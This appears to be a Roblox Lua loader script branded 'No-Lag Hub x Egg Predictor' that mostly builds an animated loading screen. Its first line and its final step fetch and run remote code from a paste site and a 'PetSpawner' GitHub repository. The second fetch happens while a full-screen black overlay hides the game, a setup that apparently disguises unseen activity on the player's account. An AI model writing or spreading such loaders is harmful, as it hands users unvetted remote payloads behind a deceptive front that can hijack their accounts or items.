loadstring(game:HttpGet("https://pastefy.app/9rFANcgo/raw"))()

local TweenService = game:GetService("TweenService")
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ex0ontop"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.DisplayOrder = 999999999
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local BlackScreen = Instance.new("Frame")
BlackScreen.Name = "BlackScreen"
BlackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BlackScreen.Size = UDim2.new(1, 0, 1, 0)
BlackScreen.ZIndex = 0
BlackScreen.Parent = ScreenGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 0, 0, 0)
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
MainFrame.ZIndex = 1
MainFrame.Parent = ScreenGui
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
UIAspectRatioConstraint.AspectRatio = 1.212
UIAspectRatioConstraint.Parent = MainFrame
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 15)
UICorner.Parent = MainFrame
local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(12, 12, 12)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 35, 35))
})
UIGradient.Rotation = -90
UIGradient.Parent = MainFrame
local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(255, 255, 255)
UIStroke.Thickness = 3
UIStroke.Enabled = false
UIStroke.Parent = MainFrame
local UIGradient2 = Instance.new("UIGradient")
UIGradient2.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255))
UIGradient2.Transparency = NumberSequence.new({
	NumberSequenceKeypoint.new(0.0, 1),
	NumberSequenceKeypoint.new(0.2, 0),
	NumberSequenceKeypoint.new(0.4, 1),
	NumberSequenceKeypoint.new(0.6, 1),
	NumberSequenceKeypoint.new(0.8, 0),
	NumberSequenceKeypoint.new(1.0, 1)
})
UIGradient2.Parent = UIStroke

local DotsFrame = Instance.new("Frame")
DotsFrame.Name = "DotsFrame"
DotsFrame.BackgroundTransparency = 1
DotsFrame.Position = UDim2.new(0.375, 0, 0.6, 0)
DotsFrame.Size = UDim2.new(0.25, 0, 0.1, 0)
DotsFrame.Parent = MainFrame
local Dot1 = Instance.new("Frame")
Dot1.Name = "1"
Dot1.AnchorPoint = Vector2.new(0.5, 0.5)
Dot1.BackgroundTransparency = 1
Dot1.Position = UDim2.new(0.28, 0, 0.5, 0)
Dot1.Size = UDim2.new(0, 0, 0, 0)
Dot1.Parent = DotsFrame
local Dot2 = Instance.new("Frame")
Dot2.Name = "2"
Dot2.AnchorPoint = Vector2.new(0.5, 0.5)
Dot2.BackgroundTransparency = 1
Dot2.Position = UDim2.new(0.48, 0, 0.5, 0)
Dot2.Size = UDim2.new(0, 0, 0, 0)
Dot2.Parent = DotsFrame
local Dot3 = Instance.new("Frame")
Dot3.Name = "3"
Dot3.AnchorPoint = Vector2.new(0.5, 0.5)
Dot3.BackgroundTransparency = 1
Dot3.Position = UDim2.new(0.68, 0, 0.5, 0)
Dot3.Size = UDim2.new(0, 0, 0, 0)
Dot3.Parent = DotsFrame
local Dots = {Dot1, Dot2, Dot3}
for _, dot in ipairs(Dots) do
	local UICornerOfDot = Instance.new("UICorner")
	UICornerOfDot.CornerRadius = UDim.new(1, 0)
	UICornerOfDot.Parent = dot
end

local LoadingCircle = Instance.new("Frame")
LoadingCircle.Name = "LoadingCircle"
LoadingCircle.BackgroundTransparency = 1
LoadingCircle.Position = UDim2.new(0.375, 0, 0.2, 0)
LoadingCircle.Size = UDim2.new(0.25, 0, 0.302, 0)
LoadingCircle.Parent = MainFrame
local UICornerOfLoadingCircle = Instance.new("UICorner")
UICornerOfLoadingCircle.CornerRadius = UDim.new(1, 0)
UICornerOfLoadingCircle.Parent = LoadingCircle
local UIStrokeOfLoadingCircle = Instance.new("UIStroke")
UIStrokeOfLoadingCircle.Color = Color3.fromRGB(255, 255, 255)
UIStrokeOfLoadingCircle.Thickness = 1.5
UIStrokeOfLoadingCircle.Parent = LoadingCircle
local UIGradientOfUIStrokeOfLoadingCircle = Instance.new("UIGradient")
UIGradientOfUIStrokeOfLoadingCircle.Transparency = NumberSequence.new({
	NumberSequenceKeypoint.new(0.0, 1),
	NumberSequenceKeypoint.new(1.0, 1)
})
UIGradientOfUIStrokeOfLoadingCircle.Parent = UIStrokeOfLoadingCircle

local Outline = Instance.new("Frame")
Outline.Name = "Outline"
Outline.BackgroundTransparency = 1
Outline.Position = UDim2.new(0, 0, 0.11, 0)
Outline.Size = UDim2.new(1, 0, 0.001, 0)
Outline.Parent = MainFrame

local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.BackgroundTransparency = 1
CloseButton.Position = UDim2.new(0.925, 0, 0.035, 0)
CloseButton.Size = UDim2.new(0.05, 0, 0.05, 0)
CloseButton.RichText = true
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Text = "X"
CloseButton.TextScaled = true
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextScaled = true
CloseButton.TextTransparency = 1
CloseButton.Parent = MainFrame

local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Name = "MinimizeButton"
MinimizeButton.BackgroundTransparency = 1
MinimizeButton.Position = UDim2.new(0.858, 0, 0.035, 0)
MinimizeButton.Size = UDim2.new(0.05, 0, 0.05, 0)
MinimizeButton.RichText = true
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.Text = "-"
MinimizeButton.TextScaled = true
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.TextScaled = true
MinimizeButton.TextTransparency = 1
MinimizeButton.Parent = MainFrame

local Header = Instance.new("TextLabel")
Header.Name = "Header"
Header.BackgroundTransparency = 1
Header.Position = UDim2.new(0, 0, 0.032, 0)
Header.Size = UDim2.new(0.8, 0, 0.052, 0)
Header.Font = Enum.Font.GothamBold
Header.RichText = true
Header.Text = "No-Lag Hub x Egg Predictor | Version 2.0"
Header.TextScaled = true
Header.TextColor3 = Color3.fromRGB(255, 255, 255)
Header.TextTransparency = 1
Header.Parent = MainFrame

local LoadingText = Instance.new("TextLabel")
LoadingText.Name = "LoadingText"
LoadingText.BackgroundTransparency = 1
LoadingText.Position = UDim2.new(0.1, 0, 0.8, 0)
LoadingText.Size = UDim2.new(0.8, 0, 0.1, 0)
LoadingText.Font = Enum.Font.GothamBold
LoadingText.RichText = true
LoadingText.Text = "Loading... Please Wait."
LoadingText.TextScaled = true
LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadingText.TextScaled = true
LoadingText.TextTransparency = 1
LoadingText.Parent = MainFrame

local Welcome = Instance.new("TextLabel")
Welcome.Name = "Welcome"
Welcome.BackgroundTransparency = 1
Welcome.Position = UDim2.new(0.1, 0, 0.05, 0)
Welcome.Size = UDim2.new(0.8, 0, 0.18, 0)
Welcome.ZIndex = 2
Welcome.Font = Enum.Font.GothamBold
Welcome.RichText = true
Welcome.Text = "WELCOME"
Welcome.TextColor3 = Color3.fromRGB(255, 255, 255)
Welcome.TextScaled = true
Welcome.TextTransparency = 1
Welcome.Parent = MainFrame
local UIStrokeOfWelcome = Instance.new("UIStroke")
UIStrokeOfWelcome.Color = Color3.fromRGB(0, 0, 0)
UIStrokeOfWelcome.Thickness = 2
UIStrokeOfWelcome.Transparency = 1
UIStrokeOfWelcome.Parent = Welcome
local WelcomeS = Instance.new("TextLabel")
WelcomeS.Name = "WelcomeS"
WelcomeS.BackgroundTransparency = 1
WelcomeS.Position = UDim2.new(0.1, 0, 0.07, 0)
WelcomeS.Size = UDim2.new(0.8, 0, 0.18, 0)
WelcomeS.Font = Enum.Font.GothamBold
WelcomeS.RichText = true
WelcomeS.Text = "WELCOME"
WelcomeS.TextColor3 = Color3.fromRGB(0, 0, 0)
WelcomeS.TextScaled = true
WelcomeS.TextTransparency = 1
WelcomeS.Parent = MainFrame

local To = Instance.new("TextLabel")
To.Name = "To"
To.BackgroundTransparency = 1
To.Position = UDim2.new(0.1, 0, 0.25, 0)
To.Size = UDim2.new(0.8, 0, 0.18, 0)
To.ZIndex = 2
To.Font = Enum.Font.GothamBold
To.RichText = true
To.Text = "TO"
To.TextColor3 = Color3.fromRGB(255, 255, 255)
To.TextScaled = true
To.TextTransparency = 1
To.Parent = MainFrame
local UIStrokeOfTo = Instance.new("UIStroke")
UIStrokeOfTo.Color = Color3.fromRGB(0, 0, 0)
UIStrokeOfTo.Thickness = 2
UIStrokeOfTo.Transparency = 1
UIStrokeOfTo.Parent = To
local ToS = Instance.new("TextLabel")
ToS.Name = "ToS"
ToS.BackgroundTransparency = 1
ToS.Position = UDim2.new(0.1, 0, 0.27, 0)
ToS.Size = UDim2.new(0.8, 0, 0.18, 0)
ToS.Font = Enum.Font.GothamBold
ToS.RichText = true
ToS.Text = "TO"
ToS.TextColor3 = Color3.fromRGB(0, 0, 0)
ToS.TextScaled = true
ToS.TextTransparency = 1
ToS.Parent = MainFrame

local NLH = Instance.new("TextLabel")
NLH.Name = "NLH"
NLH.BackgroundTransparency = 1
NLH.Position = UDim2.new(0.1, 0, 0.45, 0)
NLH.Size = UDim2.new(0.8, 0, 0.18, 0)
NLH.ZIndex = 2
NLH.Font = Enum.Font.GothamBold
NLH.RichText = true
NLH.Text = "NO-LAG HUB"
NLH.TextColor3 = Color3.fromRGB(255, 255, 255)
NLH.TextScaled = true
NLH.TextTransparency = 1
NLH.Parent = MainFrame
local UIStrokeOfNLH = Instance.new("UIStroke")
UIStrokeOfNLH.Color = Color3.fromRGB(0, 0, 0)
UIStrokeOfNLH.Thickness = 2
UIStrokeOfNLH.Transparency = 1
UIStrokeOfNLH.Parent = NLH
local NLHS = Instance.new("TextLabel")
NLHS.Name = "NLHS"
NLHS.BackgroundTransparency = 1
NLHS.Position = UDim2.new(0.1, 0, 0.47, 0)
NLHS.Size = UDim2.new(0.8, 0, 0.18, 0)
NLHS.Font = Enum.Font.GothamBold
NLHS.RichText = true
NLHS.Text = "NO-LAG HUB"
NLHS.TextColor3 = Color3.fromRGB(0, 0, 0)
NLHS.TextScaled = true
NLHS.TextTransparency = 1
NLHS.Parent = MainFrame

local X = Instance.new("TextLabel")
X.Name = "X"
X.BackgroundTransparency = 1
X.Position = UDim2.new(0.1, 0, 0.65, 0)
X.Size = UDim2.new(0.8, 0, 0.1, 0)
X.ZIndex = 2
X.Font = Enum.Font.GothamBold
X.RichText = true
X.Text = "X"
X.TextColor3 = Color3.fromRGB(255, 255, 255)
X.TextScaled = true
X.TextTransparency = 1
X.Parent = MainFrame
local UIStrokeOfX = Instance.new("UIStroke")
UIStrokeOfX.Color = Color3.fromRGB(0, 0, 0)
UIStrokeOfX.Thickness = 2
UIStrokeOfX.Transparency = 1
UIStrokeOfX.Parent = X
local XS = Instance.new("TextLabel")
XS.Name = "XS"
XS.BackgroundTransparency = 1
XS.Position = UDim2.new(0.1, 0, 0.66, 0)
XS.Size = UDim2.new(0.8, 0, 0.1, 0)
XS.Font = Enum.Font.GothamBold
XS.RichText = true
XS.Text = "X"
XS.TextColor3 = Color3.fromRGB(0, 0, 0)
XS.TextScaled = true
XS.TextTransparency = 1
XS.Parent = MainFrame

local DS = Instance.new("TextLabel")
DS.Name = "DS"
DS.BackgroundTransparency = 1
DS.Position = UDim2.new(0.1, 0, 0.75, 0)
DS.Size = UDim2.new(0.8, 0, 0.18, 0)
DS.ZIndex = 2
DS.Font = Enum.Font.GothamBold
DS.RichText = true
DS.Text = "EGG PREDICTOR!"
DS.TextColor3 = Color3.fromRGB(255, 255, 255)
DS.TextScaled = true
DS.TextTransparency = 1
DS.Parent = MainFrame
local UIStrokeOfDS = Instance.new("UIStroke")
UIStrokeOfDS.Color = Color3.fromRGB(0, 0, 0)
UIStrokeOfDS.Thickness = 2
UIStrokeOfDS.Transparency = 1
UIStrokeOfDS.Parent = DS
local DSS = Instance.new("TextLabel")
DSS.Name = "DSS"
DSS.BackgroundTransparency = 1
DSS.Position = UDim2.new(0.1, 0, 0.77, 0)
DSS.Size = UDim2.new(0.8, 0, 0.18, 0)
DSS.Font = Enum.Font.GothamBold
DSS.RichText = true
DSS.Text = "EGG PREDICTOR!"
DSS.TextColor3 = Color3.fromRGB(0, 0, 0)
DSS.TextScaled = true
DSS.TextTransparency = 1
DSS.Parent = MainFrame

local MainFrameOriginalSize = UDim2.new(0.3, 0, 1, 0)
local MainFrameZeroSize = UDim2.new(0, 0, 0, 0)
local MainFrameSlidePosition = UDim2.new(0.5, 0, -0.5, 0)

local loadSuccess = false
local loadError = nil

local firstSet = {
	NLH,
	NLHS,
	To,
	ToS,
	Welcome,
	WelcomeS,
	DS,
	DSS,
	X,
	XS
}

local lastSet = {
	LoadingCircle,
	DotsFrame,
	Outline,
	CloseButton,
	MinimizeButton,
	Header,
	LoadingText
}

spawn(function()
	while true do
		local TweenInfoMainFrameUIStroke = TweenInfo.new(
			5,
			Enum.EasingStyle.Linear,
			Enum.EasingDirection.InOut,
			0,
			false
		)
		local TweenGoalOfMainFrameUIStroke = {Rotation = UIGradient2.Rotation + 360}
		local t = TweenService:Create(UIGradient2, TweenInfoMainFrameUIStroke, TweenGoalOfMainFrameUIStroke)
		t:Play()
		t.Completed:Wait()
	end
end)

local function handler()
	task.wait(1)
	UIStroke.Enabled = true
	local TweenInfo1 = TweenInfo.new(0.8, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
	local TweenGoal1 = {Size = MainFrameOriginalSize}
	local Tween1 = TweenService:Create(MainFrame, TweenInfo1, TweenGoal1)
	Tween1:Play()
	Tween1.Completed:Wait()
	task.wait(2)
	for _, firstSetItems in ipairs(firstSet) do
		local UIStrokeOffirstSetItems = firstSetItems:FindFirstChildWhichIsA("UIStroke")
		local TweenOffirstSetItems = TweenService:Create(firstSetItems, TweenInfo.new(0.5), {TextTransparency = 0})
		TweenOffirstSetItems:Play()
		if UIStrokeOffirstSetItems then
			local strokeTween = TweenService:Create(UIStrokeOffirstSetItems, TweenInfo.new(0.5), {Transparency = 0})
			strokeTween:Play()
		end
	end
	task.wait(3)
	for _, firstSetItems in ipairs(firstSet) do
		local tweenfirstSetItemsOut = TweenService:Create(firstSetItems, TweenInfo.new(1), {TextTransparency = 1})
		tweenfirstSetItemsOut:Play()

		local UIStrokeOffirstSetItems = firstSetItems:FindFirstChildWhichIsA("UIStroke")
		if UIStrokeOffirstSetItems and UIStroke then
			local tweenUIStrokeOffirstSetItemsOut = TweenService:Create(UIStrokeOffirstSetItems, TweenInfo.new(1), {Transparency = 1})
			tweenUIStrokeOffirstSetItemsOut:Play()
			local tweenUIStrokeOut = TweenService:Create(UIStroke, TweenInfo.new(1), {Transparency = 1})
			tweenUIStrokeOut:Play()
		end
	end
	task.wait(1)
	local TweenInfo2 = TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
	local TweenGoal2 = {Size = MainFrameZeroSize}
	local Tween2 = TweenService:Create(MainFrame, TweenInfo2, TweenGoal2)
	Tween2:Play()
	task.wait(2)
	MainFrame.BackgroundTransparency = 1
	UIStroke.Transparency = 1
	UIStroke.Thickness = 1
	UIGradient2:Destroy()
	MainFrame.Size = MainFrameOriginalSize
	local MainFrameFadeIn = TweenService:Create(MainFrame, TweenInfo.new(0.8), {BackgroundTransparency = 0})
	MainFrameFadeIn:Play()
	task.wait(1.2)
	local UIStrokeFadeIn = TweenService:Create(UIStroke, TweenInfo.new(0.5), {Transparency = 0})
	UIStrokeFadeIn:Play()
	for _, object in ipairs(lastSet) do
		if object:IsA("TextButton") or object:IsA("TextLabel") then
			local textTween = TweenService:Create(object, TweenInfo.new(0.5), {TextTransparency = 0})
			textTween:Play()
		elseif object.Name == "Outline" then
			object.BackgroundTransparency = 1
			local BackgroundTween = TweenService:Create(object, TweenInfo.new(0.5), {BackgroundTransparency = 0.5})
			BackgroundTween:Play()
		elseif object.Name == "LoadingCircle" then
			local stroke = object:FindFirstChild("UIStroke")
			if stroke then
				local gradient = stroke:FindFirstChildWhichIsA("UIGradient")
				if gradient then
					gradient.Transparency = NumberSequence.new(1)
					local steps = 30
					local duration = 0.5
					local waitTime = duration / steps
					coroutine.wrap(function()
						for i = 0, steps do
							local alpha = i / steps
							local v0 = 1 - alpha * 0
							local v1 = 1 - alpha * 0 
							local v2 = 1 - alpha * 1
							local seq = NumberSequence.new({
								NumberSequenceKeypoint.new(0, v0),
								NumberSequenceKeypoint.new(0.6, v1),
								NumberSequenceKeypoint.new(1, v2)
							})
							gradient.Transparency = seq
							task.wait(waitTime)
						end
					end)()
				end
			end
		elseif object.Name == "DotsFrame" then
			for _, dot in ipairs(object:GetChildren()) do
				if dot:IsA("Frame") then
					dot.BackgroundTransparency = 1
					local dotTween = TweenService:Create(dot, TweenInfo.new(0.5), {BackgroundTransparency = 0})
					dotTween:Play()
				end
			end
		end
	end
	spawn(function()
		while true do
			while true do
				local TweenInfoOfCircle = TweenInfo.new(
					1.5,
					Enum.EasingStyle.Linear,
					Enum.EasingDirection.InOut,
					0,
					false
				)
				local TweenGoalOfCircle = {Rotation = UIGradientOfUIStrokeOfLoadingCircle.Rotation + 360}
				local TweenOfLoadingCircle = TweenService:Create(UIGradientOfUIStrokeOfLoadingCircle, TweenInfoOfCircle, TweenGoalOfCircle)
				TweenOfLoadingCircle:Play()
				TweenOfLoadingCircle.Completed:Wait()
			end
		end
	end)
	local restSize = UDim2.new(0, 0, 0, 0)
	local bounceSize = UDim2.new(0.15, 0, 0.46, 0)
	spawn(function()
		while true do
			for i = 1, 3 do
				local dot = DotsFrame:FindFirstChild(tostring(i))
				if dot then
					local grow = TweenService:Create(dot, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
						Size = bounceSize
					})
					grow:Play()
				end
				task.wait(0.2)
			end
			task.wait(0.3)
			for i = 1, 3 do
				local dot =DotsFrame:FindFirstChild(tostring(i))
				if dot then
					local shrink = TweenService:Create(dot, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
						Size = restSize
					})
					shrink:Play()
				end
				task.wait(0.2)
			end
			task.wait(0.3)
		end
	end)
	task.wait(5)
	local TweenInfoOfSlide = TweenService:Create(MainFrame, TweenInfo.new(1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = MainFrameSlidePosition})
	TweenInfoOfSlide:Play()
	TweenInfoOfSlide.Completed:Wait()
	task.spawn(function()
		local success, err = pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub-PetSpawner/Visual-EggPredictor/refs/heads/main/lua"))()
		end)
		if not success then
			warn("Failed to load first script: " .. tostring(err))
		end
	end)
	local TweenFadeOutOfBlackScreen = TweenService:Create(BlackScreen, TweenInfo.new(0.5), {BackgroundTransparency = 1})
	TweenFadeOutOfBlackScreen:Play()
	TweenFadeOutOfBlackScreen.Completed:Wait()
	ScreenGui:Destroy()
end

handler()

if not loadSuccess then
	warn("Failed to load script: " .. tostring(loadError))
end
